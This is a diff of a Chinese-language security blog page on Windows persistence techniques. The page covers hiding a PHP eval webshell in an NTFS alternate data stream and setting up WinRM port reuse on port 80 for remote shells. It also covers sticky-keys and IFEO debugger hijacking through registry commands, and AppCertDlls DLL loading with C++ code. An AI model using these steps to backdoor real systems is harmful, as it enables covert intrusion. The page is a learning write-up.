@@ -107,6 +107,16 @@
     
 	<!-- mathjax -->
 	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
 <meta name="generator" content="Hexo 6.1.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -121,13 +131,13 @@
         <!--
        --><li><a href="/">Home</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">Articles</a></li><!--
      --><!--
-       --><li><a href="/categories/">categories</a></li><!--
+       --><li><a href="/categories">Categories</a></li><!--
      --><!--
-       --><li><a href="/tags/">tags</a></li><!--
+       --><li><a href="/tags">Tags</a></li><!--
      --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projectes</a></li><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/N0el4kLs">Projects</a></li><!--
      -->
       </ul>
     </span>
@@ -227,13 +237,13 @@
 <p>大多数情况下,我们获取 <code>webshell</code> 的方法都是通过文件上传. 关于文件, 最直接的隐藏方法就是对文件添加隐藏属性.</p>
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5Cef4654e79b60d2e404949ff0c6dc4da9.png" alt="20220620163639"></p>
 <p>你也可以使用 <code>cmd</code> 命令进行操作从而达到同样的目的.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTRIB +h fileName</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">ATTRIB +h fileName</code></pre>
 
 <p>如果用户稍微了解一下隐藏文件的查看方式,这种隐藏文件很容易被发现.<br><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C5bb70d8e5dad35d2e051f60fefb92de8.png" alt="20220620164125"></p>
 <p>这时你可以为文件添加额外的属性来达到简单的绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTRIB +h +a +s +r 1.txt</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">ATTRIB +h +a +s +r 1.txt</code></pre>
 <p>这样即使用户在 <code>查看</code> 设置中开启了 <code>查看隐藏项目</code> 的选项,但是还是无法看到隐藏文件. 不过这两种方式都没法逃掉使用 <code>cmd</code> 命令查看隐藏文件的方式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /a:h</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">dir /a:h</code></pre>
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C57bb14c317679c4735cffac9cd5f43b2.png" alt="20220620164958"></p>
 <p><code>通过ADS流文件来隐藏文件</code></p>
 <p>什么是 <code>ADS流文件</code></p>
@@ -246,17 +256,19 @@
 </blockquote>
 <p>不过这里要做的不是绕过后缀,而是使文件隐藏.</p>
 <p>假设目标服务器上已经存在一个 <code>index.php</code>. 我们可以通过一下命令添加一个数据流文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;&quot; &gt;&gt;index.php:1.txt</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">echo &quot;&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;&quot; &gt;&gt;index.php:1.txt</code></pre>
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C856f91f7fc2b2022a9bb9ea2d0d830a4.png" alt="20220620170639"><br>通过截图结果我们看到目标目录中并不存在一个叫 <code>index.php:1.txt</code> 的文件,但是通过 <code>dir /r</code> 命令可以看到确实是存在这个文件的. 那我们追加一句话木马在里面的吗? 我们用 <code>notepad index.php:1.txt</code>查看一下这个流文件.</p>
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C7879c87e60a74a86bfff5938848abd86.png" alt="20220620171206"></p>
 <p>这下你该相信了吧.<br>文件既然隐藏了,那要怎么利用呢? 答案是利用 <code>Php</code> 的文件包含函数. 举个例子:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;this is config.php&quot;</span>;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;index.php:1.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is config.php&quot;</span>;
+    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;index.php:1.txt&quot;</span>);</code></pre>
 
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C7188e452e06cf24b07bea1c3802988d2.png" alt="20220620172102"></p>
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5Cb116d045ac23de302ff6075c6302f6a1.png" alt="20220620172043"></p>
 <p>可以看到这里代码成功执行.</p>
 <p>文件流除了能够追加在文件中之外，还能追加到目录中.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt;&gt;:1.txt</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">echo &quot;&lt;?php phpinfo();?&gt;&quot; &gt;&gt;:1.txt</code></pre>
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C12f3d8913d86ff928bdba71f960489f8.png" alt="20220620205810"></p>
 <p>但是这里我们不能通过 <code>.:1.txt</code> 直接获取文件内容<br><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5Ccc8a3ef35b40e830373bc1c2523fd859.png" alt="20220620205841"></p>
 <p>这里需要回到上级目录,利用 <code>上级目录名:1.txt</code> 才能访问到文件,比如我这里的上级目录名为 <code>demo</code>,则我需要返回到上一级目录,通过 <code>demo:1.txt</code> 来获取内容.</p>
@@ -352,39 +364,45 @@
 <p>因为 <code>WinRM</code> 已经实现了路由前缀的注册,现在我们只需要遵循 <code>Net.tcp Port Shareing</code>的协议规则,将 <code>WinRM</code> 添加到指定端口复用的规则中去就好了.</p>
 <p><code>相关命令</code></p>
 <p>查看本机已经注册的路由前缀</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh http show servicestate</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs sh">netsh http show servicestate</code></pre>
 
 <p>开启 <code>WinRm</code> 服务</p>
 <blockquote>
 <p>Windows 2012及以上：winrm默认启动并监听了5985端口。</p>
 <p>Windows 2008：需要手动启动winrm</p>
 </blockquote>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig ‐q</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs sh">winrm quickconfig ‐q</code></pre>
 
 <p>增加端口复用</p>
 <blockquote>
 <p>将 winrm 增加到端口服用的规则中</p>
 </blockquote>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/service @&#123;EnableCompatibilityHttpListener=<span class="string">&quot;true&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs sh">winrm <span class="hljs-built_in">set</span> winrm/config/service @&#123;EnableCompatibilityHttpListener=<span class="hljs-string">&quot;true&quot;</span>&#125;</code></pre>
 
 <p>更改 <code>WinRM</code> 的端口,这里将器端口改为 <code>80</code></p>
 <blockquote>
 <p>虽然现在 winrm 已经满足端口复用的规则, winrm 默认的复用端口为5985,为了不引起管理员的怀疑,我想将通过80端口访问到目标机器的 winrm<br>服务,所以这里将 winrm 的端口进行更改.</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;</code></pre>
 
 <p><code>测试</code></p>
 <p>这里我依次使用上面的命令,已经创建好了一个 <code>80</code> 端口的 <code>winrm</code> 端口复用.(虚拟机忘记拍摄快照 导致操作无法回退,过程就不要截图了.)<br><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C5d114194df3ee07e7864ad35b735c9df.png" alt="20220622162536"></p>
 <p>这里使用攻击机,也就是我物理机,使用 <code>winrm</code> 去连接远程主机.<br>同样,首先本机得开启 <code>winrm</code> 服务.直接连接远程主机会报错,这时候我们需要设置信任主机地址:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Client @&#123;TrustedHosts=<span class="string">&quot;*&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs sh">winrm <span class="hljs-built_in">set</span> winrm/config/Client @&#123;TrustedHosts=<span class="hljs-string">&quot;*&quot;</span>&#125;</code></pre>
 
 <p>之后就可以直接使用账号密码执行命令了.</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.112.129 -u:administrator -p:******* <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 你也可以使用 cmd 获取一个交互式的shell</span></span><br><span class="line">winrs -r:http://192.168.112.129 -u:administrator -p:******* cmd</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs sh">winrs -r:http://192.168.112.129 -u:administrator -p:******* <span class="hljs-built_in">whoami</span>
+
+<span class="hljs-comment"># 你也可以使用 cmd 获取一个交互式的shell</span>
+winrs -r:http://192.168.112.129 -u:administrator -p:******* cmd</code></pre>
 
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5C8484137f1ed755b17e36b16123e3dd8f.png" alt="20220622163329"></p>
 <p><img src="http://particles.oss-cn-beijing.aliyuncs.com/img%5Cd0d743e75fb266a0a1c6338ebe5a46b4.png" alt="20220622164125"></p>
 <h2 id="进阶篇之辅助功能镜像劫持"><a href="#进阶篇之辅助功能镜像劫持" class="headerlink" title="进阶篇之辅助功能镜像劫持"></a>进阶篇之辅助功能镜像劫持</h2><p><code>Windows</code>提供了一系列辅助功能的软件,以方便部分用户对<code>Windows</code>的使用,比如大家熟悉的<code>粘滞键</code>.,除了<code>粘滞键</code>,其他的辅助工具以及其位置,快捷键为:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\sethc.exe    粘滞键    快捷键：按五次 shift 键</span><br><span class="line">C:\Windows\System32\utilman.exe     设置中心   快捷键：Windows+U 键</span><br><span class="line">C:\Windows\System32\osk.exe        屏幕键盘</span><br><span class="line">C:\Windows\System32\Magnify.exe    放大镜      快捷键：Windows+加减号</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">C:\Windows\System32\sethc.exe    粘滞键    快捷键：按五次 shift 键
+C:\Windows\System32\utilman.exe     设置中心   快捷键：Windows+U 键
+C:\Windows\System32\osk.exe        屏幕键盘
+C:\Windows\System32\Magnify.exe    放大镜      快捷键：Windows+加减号</code></pre>
 
 <p>在早期,类似于<code>粘滞键</code>在用户未登陆时通过<code>按五次shift</code>就能触发,由于<code>按五次shift</code> 执行的<code>C:\Windows\System32\sethc.exe</code>这个应用程序,所以聪明的黑客将<code>cmd.exe</code>程序复制了一封,并命名为<code>setch.exe</code>,将源文件覆盖,所有使用 <code>五次shift</code>就能执行<code>cmd</code>.这就是所谓的<code>五次shift</code>后门了.</p>
 <blockquote>
@@ -395,11 +413,11 @@
 <p>造成映像劫持的罪魁祸首就是参数“Debugger”，它是IFEO里第一个被处理的参数，系统如果发现某个程序文件在IFEO列表中，它就会首先来读取Debugger参数，如果该参数不为空，系统则会把Debugger参数里指定的程序文件名作为用户试图启动的程序执行请求来处理，而仅仅把用户试图启动的程序作为Debugger参数里指定的程序文件名的参数发送过去。</p>
 </blockquote>
 <p>如上提到的注册表为:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\</code></pre>
 
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220803173136508.png" alt="image-20220803173136508"></p>
 <p>下面我们来进行测试,为了方便,这里我已劫持放大镜为例:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\Windows\System32\calc.exe&quot; /f</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs plaintext">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe&quot; /t REG_SZ /v Debugger /d &quot;C:\Windows\System32\calc.exe&quot; /f</code></pre>
 
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220803174455334.png" alt="image-20220803174455334"></p>
 <p>创建完成,接下来我们运行放大镜,</p>
@@ -413,9 +431,59 @@
 </blockquote>
 <p>测试:</p>
 <p>使用<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36374896/article/details/107005578">代码</a>快速创建 <code>AppCertDlls</code> 项:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Project1.exe</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD dwDisposition;</span><br><span class="line">	HKEY hKey;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> path[] = <span class="string">&quot;C:\\dll.dll&quot;</span>;</span><br><span class="line">	<span class="built_in">RegCreateKeyExA</span>(HKEY_LOCAL_MACHINE,<span class="string">&quot;SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WRITE, <span class="literal">NULL</span>, &amp;hKey, &amp;dwDisposition);</span><br><span class="line">	<span class="built_in">RegSetValueExA</span>(hKey, <span class="string">&quot;Default&quot;</span>, <span class="number">0</span>, REG_SZ, (BYTE*)path, (<span class="number">1</span> + ::<span class="built_in">lstrlenA</span>(path)));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line">	<span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-comment">// Project1.exe</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span> </span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span> </span>
+<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
+ 
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+	DWORD dwDisposition;
+	HKEY hKey;
+	<span class="hljs-type">const</span> <span class="hljs-type">char</span> path[] = <span class="hljs-string">&quot;C:\\dll.dll&quot;</span>;
+	<span class="hljs-built_in">RegCreateKeyExA</span>(HKEY_LOCAL_MACHINE,<span class="hljs-string">&quot;SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, KEY_WRITE, <span class="hljs-literal">NULL</span>, &amp;hKey, &amp;dwDisposition);
+	<span class="hljs-built_in">RegSetValueExA</span>(hKey, <span class="hljs-string">&quot;Default&quot;</span>, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)path, (<span class="hljs-number">1</span> + ::<span class="hljs-built_in">lstrlenA</span>(path)));
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+&#125;
+ 
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+	<span class="hljs-built_in">test</span>();
+	<span class="hljs-comment">//system(&quot;pause&quot;);</span>
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+&#125;</code></pre>
 
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="comment">// dll.dll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">TestMutex</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hMutex = <span class="built_in">CreateMutexA</span>(<span class="literal">NULL</span>, <span class="literal">false</span>, <span class="string">&quot;myself&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">GetLastError</span>() == ERROR_ALREADY_EXISTS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hMutex);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:  <span class="comment">//进程创建执行</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">TestMutex</span>() == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> TRUE;</span><br><span class="line">		<span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;hello qianxiao996&quot;</span>, <span class="string">&quot;AppCert&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH:  <span class="comment">//进=线程创建执行</span></span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH:  <span class="comment">//进程结束执行</span></span><br><span class="line"> 	<span class="keyword">case</span> DLL_PROCESS_DETACH: <span class="comment">//线程结束执行</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs cpp"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span>
+<span class="hljs-comment">// dll.dll</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-function">BOOL <span class="hljs-title">TestMutex</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+	HANDLE hMutex = <span class="hljs-built_in">CreateMutexA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;myself&quot;</span>);
+	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">GetLastError</span>() == ERROR_ALREADY_EXISTS)
+	&#123;
+		<span class="hljs-built_in">CloseHandle</span>(hMutex);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+	&#125;
+	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+&#125;
+ 
+<span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span></span>
+<span class="hljs-function"></span>&#123;
+	<span class="hljs-keyword">switch</span> (ul_reason_for_call)
+	&#123;
+	<span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:  <span class="hljs-comment">//进程创建执行</span>
+		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">TestMutex</span>() == <span class="hljs-number">0</span>)
+			<span class="hljs-keyword">return</span> TRUE;
+		<span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;hello qianxiao996&quot;</span>, <span class="hljs-string">&quot;AppCert&quot;</span>, <span class="hljs-number">0</span>);
+	<span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:  <span class="hljs-comment">//进=线程创建执行</span>
+	<span class="hljs-keyword">case</span> DLL_THREAD_DETACH:  <span class="hljs-comment">//进程结束执行</span>
+ 	<span class="hljs-keyword">case</span> DLL_PROCESS_DETACH: <span class="hljs-comment">//线程结束执行</span>
+		<span class="hljs-keyword">break</span>;
+	&#125;
+	<span class="hljs-keyword">return</span> TRUE;
+&#125;</code></pre>
 
 <blockquote>
 <p>注意: 这里使用 visual studio 生成解决方案是使用 realse,避免后面运行 exe和加载 dll 时出现杂七杂八的问题.</p>
@@ -423,7 +491,32 @@
 <p>将生成的 <code>dll.dll</code> 放在<code>c:\dll.dll</code>,运行 <code>Project1.exe</code>,运行后,可以看到新生成<code>AppCertDlls</code> 项,并且指定了默认加载的dll文件为<code>c:\dll.dll</code>.</p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220703135951590.png" alt="image-20220703135951590"></p>
 <p>接下来我们使用<code>CreateProcess</code> 创建一个进程,代码如下:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	STARTUPINFO startupInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	PROCESS_INFORMATION processInformation = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	BOOL bSuccess = <span class="built_in">CreateProcess</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;C:\Windows\System32\notepad.exe&quot;</span>), <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;startupInfo, &amp;processInformation);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bSuccess)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Process started.&quot;</span> &lt;&lt; endl</span><br><span class="line">			&lt;&lt; <span class="string">&quot;Process ID:\t&quot;</span></span><br><span class="line">			&lt;&lt; processInformation.dwProcessId &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Cannot start process!&quot;</span> &lt;&lt; endl</span><br><span class="line">			&lt;&lt; <span class="string">&quot;Error code:\t&quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span> </span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span> </span>
+<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
+
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
+<span class="hljs-function"></span>&#123;
+	STARTUPINFO startupInfo = &#123; <span class="hljs-number">0</span> &#125;;
+	PROCESS_INFORMATION processInformation = &#123; <span class="hljs-number">0</span> &#125;;
+
+	BOOL bSuccess = <span class="hljs-built_in">CreateProcess</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;C:\Windows\System32\notepad.exe&quot;</span>), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;startupInfo, &amp;processInformation);
+
+	<span class="hljs-keyword">if</span> (bSuccess)
+	&#123;
+		cout &lt;&lt; <span class="hljs-string">&quot;Process started.&quot;</span> &lt;&lt; endl
+			&lt;&lt; <span class="hljs-string">&quot;Process ID:\t&quot;</span>
+			&lt;&lt; processInformation.dwProcessId &lt;&lt; endl;
+	&#125;
+	<span class="hljs-keyword">else</span>
+	&#123;
+		cout &lt;&lt; <span class="hljs-string">&quot;Cannot start process!&quot;</span> &lt;&lt; endl
+			&lt;&lt; <span class="hljs-string">&quot;Error code:\t&quot;</span> &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; endl;
+	&#125;
+
+
+	<span class="hljs-keyword">return</span> <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);
+&#125;</code></pre>
 
 <p>双击运行,可以看到成功触发<code>dll.dll</code>.</p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220703140115498.png" alt="image-20220703140115498"></p>
@@ -433,7 +526,7 @@
 </blockquote>
